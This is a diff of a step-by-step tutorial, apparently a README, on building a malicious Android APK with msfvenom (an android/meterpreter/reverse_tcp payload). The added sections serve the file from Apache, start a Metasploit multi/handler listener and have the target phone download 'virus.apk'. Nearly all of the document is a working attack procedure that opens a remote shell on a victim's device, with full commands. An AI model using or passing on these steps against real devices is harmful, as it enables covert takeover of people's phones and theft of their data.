@@ -3,13 +3,13 @@ Kali linux is an OS that is focused on pentesting and ethical hacking. It if tot
 
 **More info at https://www.kali.org/**
 
-## 1)Creating the maliciuos file
+## 1) Creating the maliciuos file
 The first thing that we need to make, is to create a malicious file with the correct parameters as for making a connection between our computer and the affected device.
 #### `msfvenom -p android/meterpreter/reverse_tcp LHOST=(ENTER YOUR IP ADRESS WITHOUT THE BRACKETS) LPORT=8080  R> virus.apk`
 
 **You can know th IP adress of your device by entering ```ifconfig```**
 
-## 2)Uploading the file to an apache server.
+## 2) Uploading the file to an apache server.
 This method consists in uploading the file to a server that is hosted by the linux machine. You can make shure if it is running by entering this command.
 
 ```sudo service apache2 status```
@@ -18,7 +18,7 @@ This method consists in uploading the file to a server that is hosted by the lin
 
 ```sudo service apache2 start```
 
-### 3)Copying the files to the apache online server
+### 3) Copying the files to the apache online server
 Now, we need to copy the malicoius file to the apache directory, in order for making it accesible on the internet.
 
 ```scp virus.apk /var/www/html/```
@@ -27,6 +27,26 @@ Now, we need to copy the malicoius file to the apache directory, in order for ma
  
  ```cd /var/www/html/ & ls```
  
- ## 4)
+ ## 4) Setting up the msfconsole
+ 
+ Now we need to set up a listener in order for capturing any activity signals from a victim. In order to do so, enter the following commands.
+ 
+ **Start the console** ```msfconsole```
+ 
+ **Start the multi handler** ```use multi/handler```
+ 
+ **Set the payload** ```set PAYLOAD android/meterpreter/reverse_tcp```
+ 
+ **Set the Host IP** ```set LHOST (THE IP ADRESS USED BEFORE WITHOUT THE BRACKETS)```
+ 
+ **Set the port** ```set LPORT 8080```
+ 
+ **Start the process!** ``exploit``
+ 
+ ## 5) Downloading the malicous file in the target device.
+ 
+ Open the phones browser, and type the ip adress as you did before followed by this ```/virus.apk```
+ 
+ **The link should look something like this; 192.168.0.152/virus.apk**
 
 
